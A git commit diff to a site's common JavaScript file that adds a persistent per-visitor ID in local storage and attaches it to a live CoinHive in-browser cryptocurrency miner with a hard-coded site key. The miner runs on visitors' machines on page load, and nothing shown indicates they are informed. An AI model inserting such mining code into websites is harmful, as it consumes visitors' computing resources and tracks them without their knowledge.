67352a5b790a256a2b3c7a8c46f64dd4ca3ebc56
Eiichi Fujimoto <work.eiichi.co.jp@gmail.com>
2017-09-26 01:12:46 +0900

    coinhive追加

--- my-js/common-script.js
+++ my-js/common-script.js
@@ -1,15 +1,29 @@
 // uuid
-var newUuid = (function() {
-    var d = +new Date();
-    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
-        .replace(/[xy]/g, function(c) {
-            var r = (d + Math.random() * 16) % 16 | 0;
-            return (c == 'x' ? r : (r & 0x3 | 0x8)).toString(16);
-        });
-});
+function generateUuid() {
+    // https://github.com/GoogleChrome/chrome-platform-analytics/blob/master/src/internal/identifier.js
+    // const FORMAT: string = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";
+    let chars = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".split("");
+    for (let i = 0, len = chars.length; i < len; i++) {
+        switch (chars[i]) {
+            case "x":
+                chars[i] = Math.floor(Math.random() * 16).toString(16);
+                break;
+            case "y":
+                chars[i] = (Math.floor(Math.random() * 4) + 8).toString(16);
+                break;
+        }
+    }
+    return chars.join("");
+}
+
+var nyannyanId = store.get('nyannyan_id');
+if (nyannyanId == undefined || nyannyanId == "") {
+    nyannyanId = generateUuid();
+    store.set('nyannyan_id', nyannyanId)
+}
 
 // CoinHive
-var miner = new CoinHive.Anonymous('lNx6RgYfV66oiZebezpuXYswaQe76D7i',{
+var miner = new CoinHive.User('lNx6RgYfV66oiZebezpuXYswaQe76D7i', nyannyanId, {
 	threads: 1,
 	autoThreads: false,
 	throttle: 0.8,
